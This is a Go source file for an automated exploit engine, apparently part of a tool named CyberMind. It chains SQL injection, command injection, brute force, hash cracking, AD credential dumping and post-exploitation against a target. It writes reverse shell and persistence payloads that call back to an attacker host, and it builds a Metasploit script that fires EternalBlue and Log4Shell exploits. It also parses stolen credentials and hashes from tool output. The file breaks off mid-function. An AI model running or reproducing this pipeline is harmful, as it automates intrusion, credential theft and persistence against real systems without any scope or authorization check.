// Package abhimanyu — CyberMind Abhimanyu Mode (Exploit Engine)
// Linux-only. Auto-chains from hunt results.
// Named after Abhimanyu from Mahabharata — enters the Chakravyuh, fights every layer.
//
// Usage:
//   cybermind /abhimanyu <target>              — full exploit (all vuln types)
//   cybermind /abhimanyu <target> sqli         — SQLi only
//   cybermind /abhimanyu <target> xss          — XSS only
//   cybermind /abhimanyu <target> rce          — RCE/CMDi only
//   cybermind /abhimanyu <target> auth         — Auth brute force
//   cybermind /abhimanyu <target> network      — Network vulns
//   cybermind /abhimanyu <target> postexploit  — Post-exploitation only
//   cybermind /abhimanyu <target> lateral      — Lateral movement only
//   cybermind /abhimanyu <target> exfil        — Exfiltration only
//
// Auto-chain: /recon → /hunt → /abhimanyu (user prompted after hunt)
// Session persistence: results saved to /tmp/cybermind_abhimanyu_<target>/session.json
package abhimanyu

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

// ExploitResult holds output from a single exploit tool
type ExploitResult struct {
	Tool    string
	Output  string
	Error   string
	Took    time.Duration
	Success bool
}

// AbhimanyuContext carries intelligence through the exploit pipeline.
// Pre-populated from hunt results when auto-chaining.
type AbhimanyuContext struct {
	Target      string
	TargetType  string // "domain" | "ip"
	VulnType    string // "all" | "sqli" | "xss" | "rce" | "auth" | "network" | "postexploit" | "lateral" | "exfil"
	LHOST       string // attacker IP for reverse shells
	LPORT       string // listener port (default 4444)

	// From hunt (pre-populated if chained)
	LiveURLs     []string
	OpenPorts    []int
	XSSFound     []string
	VulnsFound   []string
	ParamsFound  []string
	WAFDetected  bool
	WAFVendor    string
	Technologies []string

	// Credentials found during exploitation
	CredsFound   []string // "user:pass" pairs
	HashesFound  []string // NTLM/MD5/SHA hashes
	TokensFound  []string // JWT/API tokens

	// Populated during exploit phases
	Results       []ExploitResult
	ShellObtained bool
	ShellType     string // "bash" | "meterpreter" | "cmd" | "os-shell"
	ShellEvidence string // actual output proving shell

	// Session tracking for continuous research
	SessionID   string
	SessionDir  string
	StartedAt   time.Time
	LastUpdated time.Time
}

// AbhimanyuSession is persisted to disk for continuous research across sessions
type AbhimanyuSession struct {
	Target        string            `json:"target"`
	VulnType      string            `json:"vuln_type"`
	LHOST         string            `json:"lhost"`
	LPORT         string            `json:"lport"`
	StartedAt     time.Time         `json:"started_at"`
	LastUpdated   time.Time         `json:"last_updated"`
	ToolsRun      []string          `json:"tools_run"`
	Findings      map[string]string `json:"findings"`
	ShellObtained bool              `json:"shell_obtained"`
	ShellType     string            `json:"shell_type"`
	ShellEvidence string            `json:"shell_evidence"`
	OpenPorts     []int             `json:"open_ports"`
	VulnsFound    []string          `json:"vulns_found"`
	XSSFound      []string          `json:"xss_found"`
	ParamsFound   []string          `json:"params_found"`
	CredsFound    []string          `json:"creds_found"`
	HashesFound   []string          `json:"hashes_found"`
	WAFDetected   bool              `json:"waf_detected"`
	Technologies  []string          `json:"technologies"`
}

// AbhimanyuStatusKind represents the live status of an exploit tool
type AbhimanyuStatusKind string

const (
	StatusRunning AbhimanyuStatusKind = "running"
	StatusDone    AbhimanyuStatusKind = "done"
	StatusFailed  AbhimanyuStatusKind = "failed"
	StatusSkipped AbhimanyuStatusKind = "skipped"
	StatusInstalling AbhimanyuStatusKind = "installing"
)

// AbhimanyuStatus is emitted for each tool during execution
type AbhimanyuStatus struct {
	Tool   string
	Kind   AbhimanyuStatusKind
	Reason string
	Took   time.Duration
}

// ToolSpec defines an exploit tool
type ToolSpec struct {
	Name         string
	Phase        int
	Timeout      int
	VulnTypes    []string // which vuln types this tool applies to
	BuildArgs    func(target string, ctx *AbhimanyuContext) []string
	FallbackArgs []func(target string, ctx *AbhimanyuContext) []string
	InstallHint  string
	InstallCmd   string // exact install command
}

// run executes a command with timeout
func run(timeoutSec int, name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	var out bytes.Buffer
	var errOut bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errOut
	cmd.Stdin = nil // never read from tty — prevents zsh: suspended (tty input)

	done := make(chan error, 1)
	go func() { done <- cmd.Run() }()

	select {
	case err := <-done:
		combined := out.String()
		if combined == "" {
			combined = errOut.String()
		}
		if err != nil && combined == "" {
			return "", err
		}
		return combined, nil
	case <-time.After(time.Duration(timeoutSec) * time.Second):
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		partial := out.String()
		if partial != "" {
			return partial + "\n[timeout — partial results]", nil
		}
		return "", fmt.Errorf("timeout after %ds", timeoutSec)
	}
}

// isAvailable checks if a tool is installed
func isAvailable(tool string) bool {
	_, err := exec.LookPath(tool)
	return err == nil
}

// InstallTool installs a missing exploit tool using isolated venv for Python tools
func InstallTool(spec ToolSpec, progress func(AbhimanyuStatus)) error {
	if isAvailable(spec.Name) {
		return nil
	}
	progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusInstalling, Reason: "installing..."})

	if spec.InstallCmd == "" {
		return fmt.Errorf("no install command for %s", spec.Name)
	}

	// C2 tools — sliver requires manual setup (needs domain + SSL for production)
	// But we can auto-install the binary for local testing
	c2Tools := map[string]bool{"havoc": true} // only havoc is truly manual
	if c2Tools[spec.Name] {
		progress(AbhimanyuStatus{
			Tool:   spec.Name,
			Kind:   StatusSkipped,
			Reason: "C2 framework — requires manual setup. See /tmp/cybermind_c2_setup.txt",
		})
		return fmt.Errorf("c2 tool requires manual setup")
	}

	// Python pip tools — use isolated venv
	if strings.Contains(spec.InstallCmd, "pip3 install") || strings.Contains(spec.InstallCmd, "pip install") {
		pkgName := spec.Name
		// Extract package name from install command
		parts := strings.Fields(spec.InstallCmd)
		for i, p := range parts {
			if p == "install" && i+1 < len(parts) && !strings.HasPrefix(parts[i+1], "-") {
				pkgName = parts[i+1]
				break
			}
		}
		if err := installPipIsolated(spec.Name, pkgName); err == nil {
			progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusDone})
			return nil
		}
	}

	// Git tools — use isolated venv
	if strings.Contains(spec.InstallCmd, "git clone") {
		// Extract repo URL and dir from install command
		parts := strings.Fields(spec.InstallCmd)
		for i, p := range parts {
			if p == "clone" && i+2 < len(parts) {
				repoURL := parts[i+1]
				installDir := parts[i+2]
				// Find main script from install command
				mainScript := ""
				if strings.Contains(spec.InstallCmd, ".py") {
					for _, p2 := range parts {
						if strings.HasSuffix(p2, ".py") {
							mainScript = strings.TrimPrefix(p2, installDir+"/")
							break
						}
					}
				}
				if err := installGitIsolated(spec.Name, repoURL, installDir, mainScript); err == nil {
					progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusDone})
					return nil
				}
				break
			}
		}
	}

	// Default: run install command as-is
	cmd := exec.Command("bash", "-c", spec.InstallCmd)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = nil
	if err := cmd.Run(); err != nil {
		progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusFailed, Reason: err.Error()})
		return err
	}

	progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusDone})
	return nil
}

// installPipIsolated installs a pip package in an isolated venv
func installPipIsolated(toolName, pkgName string) error {
	// Method 1: pipx
	exec.Command("sudo", "apt", "install", "-y", "pipx", "python3-venv", "-q").Run()
	if _, err := exec.LookPath("pipx"); err == nil {
		cmd := exec.Command("pipx", "install", "--force", pkgName)
		cmd.Env = append(os.Environ(), "PIPX_BIN_DIR=/usr/local/bin", "PIPX_HOME=/opt/pipx")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Stdin = nil
		if cmd.Run() == nil {
			exec.Command("pipx", "ensurepath").Run()
			if _, e := exec.LookPath(toolName); e == nil {
				return nil
			}
		}
	}

	// Method 2: isolated venv
	venvDir := "/opt/" + toolName + "-venv"
	exec.Command("python3", "-m", "venv", "--clear", venvDir).Run()
	venvPip := venvDir + "/bin/pip"
	exec.Command(venvPip, "install", "--upgrade", "pip", "-q").Run()
	if exec.Command(venvPip, "install", pkgName, "-q").Run() == nil {
		venvBin := venvDir + "/bin/" + toolName
		if _, e := os.Stat(venvBin); e == nil {
			exec.Command("sudo", "ln", "-sf", venvBin, "/usr/local/bin/"+toolName).Run()
			return nil
		}
	}

	// Method 3: --break-system-packages
	return exec.Command("pip3", "install", pkgName, "--break-system-packages", "-q").Run()
}

// installGitIsolated clones a git repo and installs in isolated venv
func installGitIsolated(name, repoURL, installDir, mainScript string) error {
	exec.Command("sudo", "apt", "install", "-y", "python3-venv", "git", "-q").Run()
	exec.Command("sudo", "rm", "-rf", installDir).Run()

	if err := exec.Command("git", "clone", "--depth=1", repoURL, installDir).Run(); err != nil {
		return err
	}

	venvDir := installDir + "/.venv"
	exec.Command("python3", "-m", "venv", "--clear", venvDir).Run()
	venvPip    := venvDir + "/bin/pip"
	venvPython := venvDir + "/bin/python3"

	exec.Command(venvPip, "install", "--upgrade", "pip", "-q").Run()

	reqFile := installDir + "/requirements.txt"
	if _, err := os.Stat(reqFile); err == nil {
		exec.Command(venvPip, "install", "-r", reqFile, "-q").Run()
	}
	for _, f := range []string{installDir + "/setup.py", installDir + "/pyproject.toml"} {
		if _, err := os.Stat(f); err == nil {
			exec.Command(venvPip, "install", "-e", installDir, "-q").Run()
			break
		}
	}

	if mainScript != "" {
		scriptPath := installDir + "/" + mainScript
		wrapper := fmt.Sprintf("#!/bin/bash\nexec %s %s \"$@\"\n", venvPython, scriptPath)
		wrapperPath := "/usr/local/bin/" + name
		teeCmd := exec.Command("sudo", "tee", wrapperPath)
		teeCmd.Stdin = strings.NewReader(wrapper)
		teeCmd.Run()
		exec.Command("sudo", "chmod", "+x", wrapperPath).Run()
		if _, err := os.Stat(scriptPath); err == nil {
			return nil
		}
	}

	venvBin := venvDir + "/bin/" + name
	if _, err := os.Stat(venvBin); err == nil {
		exec.Command("sudo", "ln", "-sf", venvBin, "/usr/local/bin/"+name).Run()
		return nil
	}
	return fmt.Errorf("%s: install completed but binary not found", name)
}

// RunExploitTool runs a single exploit tool exhaustively (primary → fallbacks)
func RunExploitTool(spec ToolSpec, ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) ExploitResult {
	start := time.Now()
	progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusRunning})

	// Primary run
	args := spec.BuildArgs(ctx.Target, ctx)
	output, err := run(spec.Timeout, spec.Name, args...)

	if strings.TrimSpace(output) != "" {
		took := time.Since(start)
		progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusDone, Took: took})
		return ExploitResult{Tool: spec.Name, Output: output, Took: took, Success: true}
	}

	// Try fallbacks
	for i, fb := range spec.FallbackArgs {
		progress(AbhimanyuStatus{
			Tool:   spec.Name,
			Kind:   StatusRunning,
			Reason: fmt.Sprintf("fallback %d/%d", i+1, len(spec.FallbackArgs)),
		})
		fbArgs := fb(ctx.Target, ctx)
		fbOut, fbErr := run(spec.Timeout, spec.Name, fbArgs...)
		if strings.TrimSpace(fbOut) != "" {
			took := time.Since(start)
			progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusDone, Took: took})
			return ExploitResult{Tool: spec.Name, Output: fbOut, Took: took, Success: true}
		}
		_ = fbErr
	}

	took := time.Since(start)
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}
	progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusFailed, Took: took, Reason: errMsg})
	return ExploitResult{Tool: spec.Name, Error: errMsg, Took: took, Success: false}
}

// RunAbhimanyuMode runs the full exploit pipeline using the registry.
// Pre-installs all missing tools, then runs phase by phase.
// Uses AI to make real-time decisions about which exploits to try based on findings.
// Saves session to disk for continuous research.
func RunAbhimanyuMode(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []ExploitResult {
	// Setup session directory — 0700 so only owner can read exploit findings
	ctx.SessionDir = fmt.Sprintf("/tmp/cybermind_abhimanyu_%s", sanitizeTarget(ctx.Target))
	os.MkdirAll(ctx.SessionDir, 0700)
	ctx.StartedAt = time.Now()
	ctx.SessionID = fmt.Sprintf("%d", ctx.StartedAt.Unix())

	// Load previous session if exists (continuous research)
	prevSession := loadSession(ctx.SessionDir)
	if prevSession != nil {
		if len(prevSession.OpenPorts) > 0 && len(ctx.OpenPorts) == 0 {
			ctx.OpenPorts = prevSession.OpenPorts
		}
		if len(prevSession.VulnsFound) > 0 && len(ctx.VulnsFound) == 0 {
			ctx.VulnsFound = prevSession.VulnsFound
		}
		if len(prevSession.XSSFound) > 0 && len(ctx.XSSFound) == 0 {
			ctx.XSSFound = prevSession.XSSFound
		}
		if len(prevSession.ParamsFound) > 0 && len(ctx.ParamsFound) == 0 {
			ctx.ParamsFound = prevSession.ParamsFound
		}
		if len(prevSession.Technologies) > 0 && len(ctx.Technologies) == 0 {
			ctx.Technologies = prevSession.Technologies
		}
		if !ctx.WAFDetected {
			ctx.WAFDetected = prevSession.WAFDetected
		}
	}

	// Get tools for this vuln type
	tools := GetToolsByVulnType(ctx.VulnType)

	// ── Smart phase filtering based on target type ────────────────────────
	isWebTarget := ctx.TargetType == "domain" || (ctx.TargetType == "" && !isIPAddress(ctx.Target))
	hasShell := ctx.ShellObtained
	hasRCE := false
	for _, v := range ctx.VulnsFound {
		if strings.Contains(strings.ToLower(v), "rce") || strings.Contains(strings.ToLower(v), "command") {
			hasRCE = true
			break
		}
	}
	skipPostExploit := isWebTarget && !hasShell && !hasRCE && ctx.VulnType == "all"

	// Phase 0: Pre-install all missing tools
	for _, spec := range tools {
		if !isAvailable(spec.Name) {
			InstallTool(spec, progress)
		}
	}

	var results []ExploitResult
	findings := make(map[string]string)

	// ── Generate reverse shell commands upfront ───────────────────────────
	// These are real working commands — save to session dir for user reference
	if ctx.LHOST != "" {
		shells := GenerateReverseShell(ctx.LHOST, "4444")
		var shellGuide strings.Builder
		shellGuide.WriteString("# CyberMind Reverse Shell Guide\n")
		shellGuide.WriteString(fmt.Sprintf("# Target: %s | LHOST: %s | LPORT: 4444\n\n", ctx.Target, ctx.LHOST))
		shellGuide.WriteString("## Start listener FIRST:\n")
		shellGuide.WriteString(fmt.Sprintf("nc -lvnp 4444\n\n"))
		shellGuide.WriteString("## Reverse shell payloads (use after RCE confirmed):\n")
		for name, cmd := range shells {
			shellGuide.WriteString(fmt.Sprintf("### %s:\n%s\n\n", name, cmd))
		}
		persistence := GeneratePersistenceCommands(ctx.LHOST, "4444")
		shellGuide.WriteString("## Persistence (after shell obtained):\n")
		for name, cmd := range persistence {
			shellGuide.WriteString(fmt.Sprintf("### %s:\n%s\n\n", name, cmd))
		}
		shellGuidePath := ctx.SessionDir + "/shell_guide.md"
		os.WriteFile(shellGuidePath, []byte(shellGuide.String()), 0600)
		progress(AbhimanyuStatus{
			Tool:   "shell-guide",
			Kind:   StatusDone,
			Reason: fmt.Sprintf("Shell guide saved: %s", shellGuidePath),
		})
	}

	// ── Generate Metasploit resource script ──────────────────────────────
	// This is a real .rc file that msfconsole can execute
	rcPath := generateMSFResourceScript(ctx)
	if rcPath != "" {
		progress(AbhimanyuStatus{
			Tool:   "msf-resource",
			Kind:   StatusDone,
			Reason: fmt.Sprintf("MSF resource script: msfconsole -r %s", rcPath),
		})
	}

	for phase := 1; phase <= 6; phase++ {
		// Skip post-exploit/lateral/exfil phases for web targets without shell
		if skipPostExploit && phase >= 4 {
			for _, spec := range tools {
				if spec.Phase == phase {
					progress(AbhimanyuStatus{
						Tool:   spec.Name,
						Kind:   StatusSkipped,
						Reason: "post-exploit skipped — no shell/RCE confirmed on web target",
					})
				}
			}
			continue
		}

		// Skip evilginx2 — requires domain + SSL certificate (cannot be automated)
		// Skip donut — requires a pre-built payload file
		// These are documented in shell_guide.md for manual use

		for _, spec := range tools {
			if spec.Phase != phase {
				continue
			}

			// Tools that require manual setup — skip auto-run, document instead
			// ligolo-ng removed from manual list — it can be auto-installed via go install
			manualOnlyTools := map[string]string{
				"evilginx2": "Requires domain + SSL cert. Manual: evilginx2 -developer -p /usr/share/evilginx/phishlets/",
				"donut":     "Requires pre-built payload. Manual: donut -f payload.exe -o shellcode.bin",
			}
			if reason, isManual := manualOnlyTools[spec.Name]; isManual {
				progress(AbhimanyuStatus{
					Tool:   spec.Name,
					Kind:   StatusSkipped,
					Reason: reason,
				})
				manualPath := ctx.SessionDir + "/manual_" + spec.Name + ".txt"
				os.WriteFile(manualPath, []byte(reason+"\n"), 0600)
				continue
			}

			if !isAvailable(spec.Name) {
				progress(AbhimanyuStatus{
					Tool:   spec.Name,
					Kind:   StatusSkipped,
					Reason: "not installed — " + spec.InstallHint,
				})
				continue
			}

			result := RunExploitTool(spec, ctx, progress)
			results = append(results, result)
			ctx.Results = append(ctx.Results, result)

			if result.Output != "" {
				findings[spec.Name] = result.Output
				updateAbhimanyuContext(spec.Name, result.Output, ctx)

				if !ctx.ShellObtained && detectShellObtained(result.Output) {
					ctx.ShellObtained = true
					ctx.ShellType = detectShellType(result.Output)
					ctx.ShellEvidence = extractShellEvidence(result.Output)
					skipPostExploit = false
					progress(AbhimanyuStatus{
						Tool:   spec.Name,
						Kind:   StatusDone,
						Reason: fmt.Sprintf("🔴 SHELL OBTAINED: %s — post-exploit phases unlocked", ctx.ShellType),
					})
					shellInfo := fmt.Sprintf("Shell obtained via %s\nType: %s\nTarget: %s\nTime: %s\nEvidence: %s\n\nFull output:\n%s",
						spec.Name, ctx.ShellType, ctx.Target, time.Now().Format(time.RFC3339),
						ctx.ShellEvidence, result.Output[:min(2000, len(result.Output))])
					os.WriteFile(ctx.SessionDir+"/shell_obtained.txt", []byte(shellInfo), 0600)
				}

				saveSession(ctx, findings)
			}
		}

		// ── After Phase 2 (Auth): if creds found, run real SSH post-exploit ──
		// sshpass must be installed: sudo apt install sshpass -y
		if phase == 2 && len(ctx.CredsFound) > 0 && containsPort(ctx.OpenPorts, 22) {
			progress(AbhimanyuStatus{
				Tool:   "post-exploit-ssh",
				Kind:   StatusRunning,
				Reason: fmt.Sprintf("Credentials found (%d) + SSH open — running post-exploit", len(ctx.CredsFound)),
			})
			// Install sshpass if needed
			if !isAvailable("sshpass") {
				run(30, "bash", "-c", "sudo apt install -y sshpass 2>/dev/null || true")
			}
			postResults := RunPostExploitCommands(ctx, progress)
			results = append(results, postResults...)
			for _, r := range postResults {
				if r.Output != "" {
					findings[r.Tool] = r.Output
				}
			}
			// If SSH post-exploit succeeded, unlock post-exploit phases
			if ctx.ShellObtained {
				skipPostExploit = false
			}
		}

		// ── After Phase 1 (Web): if hashes found, auto-crack them ────────────
		if phase == 1 && len(ctx.HashesFound) > 0 {
			progress(AbhimanyuStatus{
				Tool:   "auto-crack",
				Kind:   StatusRunning,
				Reason: fmt.Sprintf("Auto-cracking %d hashes found in Phase 1", len(ctx.HashesFound)),
			})
			// Write hashes to file for john/hashcat
			hashFile := ctx.SessionDir + "/found_hashes.txt"
			os.WriteFile(hashFile, []byte(strings.Join(ctx.HashesFound, "\n")), 0600)
			// Try john first (faster for common hashes)
			if isAvailable("john") {
				johnOut, _ := run(120, "john", "--wordlist=/usr/share/wordlists/rockyou.txt", hashFile)
				if strings.TrimSpace(johnOut) != "" {
					findings["john-autocrack"] = johnOut
					updateAbhimanyuContext("john", johnOut, ctx)
					results = append(results, ExploitResult{Tool: "john-autocrack", Output: johnOut, Success: true})
				}
			}
		}
	}

	// Final session save
	saveSession(ctx, findings)

	// Print session summary
	progress(AbhimanyuStatus{
		Tool:   "session",
		Kind:   StatusDone,
		Reason: fmt.Sprintf("Session saved: %s | Shell: %v | Vulns: %d", ctx.SessionDir, ctx.ShellObtained, len(ctx.VulnsFound)),
	})

	return results
}

// generateMSFResourceScript creates a real Metasploit resource script (.rc file)
// that can be run with: msfconsole -r /path/to/script.rc
// This is genuinely useful — msfconsole -r is the real way to automate MSF.
func generateMSFResourceScript(ctx *AbhimanyuContext) string {
	if ctx.SessionDir == "" {
		return ""
	}

	var rc strings.Builder
	rc.WriteString("# CyberMind Metasploit Resource Script\n")
	rc.WriteString(fmt.Sprintf("# Target: %s | Generated: %s\n\n", ctx.Target, time.Now().Format(time.RFC3339)))

	// Setup workspace
	rc.WriteString(fmt.Sprintf("workspace -a cybermind_%s\n", sanitizeTarget(ctx.Target)))

	// Port scan via db_nmap
	portList := portListOrDefault(ctx.OpenPorts, "22,80,443,445,3389,8080,8443")
	rc.WriteString(fmt.Sprintf("db_nmap -sV -sC -T4 -p %s %s\n", portList, ctx.Target))
	rc.WriteString("vulns\n")
	rc.WriteString("services\n\n")

	// Tech-specific modules
	techStr := strings.ToLower(strings.Join(ctx.Technologies, " "))

	if strings.Contains(techStr, "smb") || containsPort(ctx.OpenPorts, 445) {
		rc.WriteString("# SMB enumeration\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/smb/smb_version\nset RHOSTS %s\nrun\n\n", ctx.Target))
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	if containsPort(ctx.OpenPorts, 22) {
		rc.WriteString("# SSH enumeration\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/ssh/ssh_version\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	if containsPort(ctx.OpenPorts, 3306) {
		rc.WriteString("# MySQL enumeration\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/mysql/mysql_version\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	if containsPort(ctx.OpenPorts, 6379) {
		rc.WriteString("# Redis — unauthenticated access check\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/redis/redis_server\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	if containsPort(ctx.OpenPorts, 27017) {
		rc.WriteString("# MongoDB — unauthenticated access check\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/mongodb/mongodb_login\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	// CVE-based modules from vulns found
	for _, vuln := range ctx.VulnsFound {
		lower := strings.ToLower(vuln)
		if strings.Contains(lower, "ms17-010") || strings.Contains(lower, "eternalblue") {
			rc.WriteString("# EternalBlue (MS17-010)\n")
			rc.WriteString(fmt.Sprintf("use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS %s\n", ctx.Target))
			if ctx.LHOST != "" {
				rc.WriteString(fmt.Sprintf("set LHOST %s\n", ctx.LHOST))
			}
			rc.WriteString("run\n\n")
		}
		if strings.Contains(lower, "log4shell") || strings.Contains(lower, "cve-2021-44228") {
			rc.WriteString("# Log4Shell (CVE-2021-44228)\n")
			rc.WriteString(fmt.Sprintf("use exploit/multi/misc/log4shell_header_injection\nset RHOSTS %s\n", ctx.Target))
			if ctx.LHOST != "" {
				rc.WriteString(fmt.Sprintf("set LHOST %s\n", ctx.LHOST))
			}
			rc.WriteString("run\n\n")
		}
	}

	rc.WriteString("# Show all findings\nvulns\ncreds\nloot\n")
	rc.WriteString("exit\n")

	rcPath := ctx.SessionDir + "/cybermind_msf.rc"
	if err := os.WriteFile(rcPath, []byte(rc.String()), 0600); err != nil {
		return ""
	}
	return rcPath
}

// containsPort checks if a port is in the list
func containsPort(ports []int, port int) bool {
	for _, p := range ports {
		if p == port {
			return true
		}
	}
	return false
}

// min returns the smaller of two ints
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// updateAbhimanyuContext extracts intelligence from tool output in real-time.
// This is the brain of Abhimanyu — it reads every tool's output and extracts
// credentials, hashes, shell indicators, and vulnerability confirmations.
func updateAbhimanyuContext(tool, output string, ctx *AbhimanyuContext) {
	lower := strings.ToLower(output)

	switch tool {
	case "sqlmap":
		// Extract confirmed SQLi + credentials from dump
		if strings.Contains(lower, "available databases") || strings.Contains(lower, "identified the following injection") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "SQLi confirmed via sqlmap")
		}
		// Extract dumped credentials: "| user | password |" table format
		for _, line := range strings.Split(output, "\n") {
			if strings.Contains(line, "|") && (strings.Contains(lower, "password") || strings.Contains(lower, "passwd")) {
				fields := strings.Split(line, "|")
				if len(fields) >= 3 {
					cred := strings.TrimSpace(fields[1]) + ":" + strings.TrimSpace(fields[2])
					if len(cred) > 3 && !strings.Contains(cred, "---") {
						ctx.CredsFound = appendUnique(ctx.CredsFound, cred)
					}
				}
			}
		}
		// Extract hashes
		extractHashes(output, ctx)

	case "commix":
		if strings.Contains(lower, "command injection") || strings.Contains(lower, "os-shell") ||
			strings.Contains(lower, "pseudo-terminal") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "CMDi/RCE confirmed via commix")
		}
		// Extract command output (id, whoami, uname)
		extractCommandOutput(output, ctx)

	case "tplmap":
		if strings.Contains(lower, "ssti") || strings.Contains(lower, "template injection") ||
			strings.Contains(lower, "os-shell") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "SSTI→RCE confirmed via tplmap")
		}
		extractCommandOutput(output, ctx)

	case "hydra":
		// Extract cracked credentials: "[22][ssh] host: 1.2.3.4   login: admin   password: pass123"
		for _, line := range strings.Split(output, "\n") {
			lineLower := strings.ToLower(line)
			if strings.Contains(lineLower, "[success]") || strings.Contains(lineLower, "login:") {
				// Parse hydra output format
				cred := parseHydraCredential(line)
				if cred != "" {
					ctx.CredsFound = appendUnique(ctx.CredsFound, cred)
					ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Auth cracked: "+cred)
				}
			}
		}

	case "john", "hashcat":
		// Extract cracked hashes: "password123 (admin)"
		for _, line := range strings.Split(output, "\n") {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			// hashcat format: "hash:password" or john format: "password (user)"
			if strings.Contains(line, ":") || (strings.Contains(line, "(") && strings.Contains(line, ")")) {
				ctx.CredsFound = appendUnique(ctx.CredsFound, "cracked:"+line)
			}
		}

	case "linpeas":
		// Extract privesc vectors
		if strings.Contains(lower, "sudo") && strings.Contains(lower, "nopasswd") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "PrivEsc: sudo NOPASSWD")
		}
		if strings.Contains(lower, "suid") && strings.Contains(lower, "/usr/") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "PrivEsc: SUID binary found")
		}
		if strings.Contains(lower, "writable") && strings.Contains(lower, "/etc/passwd") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "PrivEsc: /etc/passwd writable!")
		}
		if strings.Contains(lower, "cve-") {
			// Extract CVE IDs from linpeas output
			for _, line := range strings.Split(output, "\n") {
				if strings.Contains(strings.ToUpper(line), "CVE-") {
					ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Kernel CVE: "+strings.TrimSpace(line))
				}
			}
		}

	case "bloodhound-python":
		if strings.Contains(lower, "done") || strings.Contains(lower, "zip") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "BloodHound data collected — check for attack paths")
		}

	case "certipy":
		if strings.Contains(lower, "vulnerable") || strings.Contains(lower, "esc") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "AD CS vulnerable: "+extractCertipyFinding(output))
		}

	case "crackmapexec", "netexec":
		// Extract credentials and shares
		for _, line := range strings.Split(output, "\n") {
			if strings.Contains(line, "[+]") {
				ctx.VulnsFound = appendUnique(ctx.VulnsFound, "CME: "+strings.TrimSpace(line))
			}
		}
		extractHashes(output, ctx)

	case "impacket-secretsdump":
		// Extract NTLM hashes: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::"
		for _, line := range strings.Split(output, "\n") {
			if strings.Count(line, ":") >= 3 && len(line) > 30 {
				ctx.HashesFound = appendUnique(ctx.HashesFound, strings.TrimSpace(line))
			}
		}
		if len(ctx.HashesFound) > 0 {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, fmt.Sprintf("Dumped %d NTLM hashes", len(ctx.HashesFound)))
		}

	case "searchsploit":
		// Extract relevant exploits
		for _, line := range strings.Split(output, "\n") {
			if strings.Contains(strings.ToLower(line), "remote") || strings.Contains(strings.ToLower(line), "rce") {
				ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Exploit: "+strings.TrimSpace(line))
			}
		}

	case "msfconsole":
		// Extract vulns from MSF output
		if strings.Contains(lower, "vulnerable") || strings.Contains(lower, "success") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "MSF: "+extractMSFVuln(output))
		}
		extractHashes(output, ctx)
	}
}

// extractHashes finds NTLM/MD5/SHA hashes in tool output
func extractHashes(output string, ctx *AbhimanyuContext) {
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		// NTLM hash pattern: 32 hex chars
		if len(line) >= 32 {
			fields := strings.Fields(line)
			for _, f := range fields {
				if len(f) == 32 || len(f) == 40 || len(f) == 64 {
					allHex := true
					for _, c := range f {
						if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
							allHex = false
							break
						}
					}
					if allHex {
						ctx.HashesFound = appendUnique(ctx.HashesFound, f)
					}
				}
			}
		}
	}
}

// extractCommandOutput extracts id/whoami/uname output from RCE tools
func extractCommandOutput(output string, ctx *AbhimanyuContext) {
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		// uid=0(root) or uid=33(www-data)
		if strings.HasPrefix(line, "uid=") {
			ctx.ShellEvidence = line
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "RCE confirmed: "+line)
		}
		// Linux kernel version
		if strings.Contains(line, "Linux") && strings.Contains(line, "#") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Kernel: "+line)
		}
	}
}

// parseHydraCredential extracts "user:pass@service" from hydra output line
func parseHydraCredential(line string) string {
	// Format: "[22][ssh] host: 1.2.3.4   login: admin   password: pass123"
	lower := strings.ToLower(line)
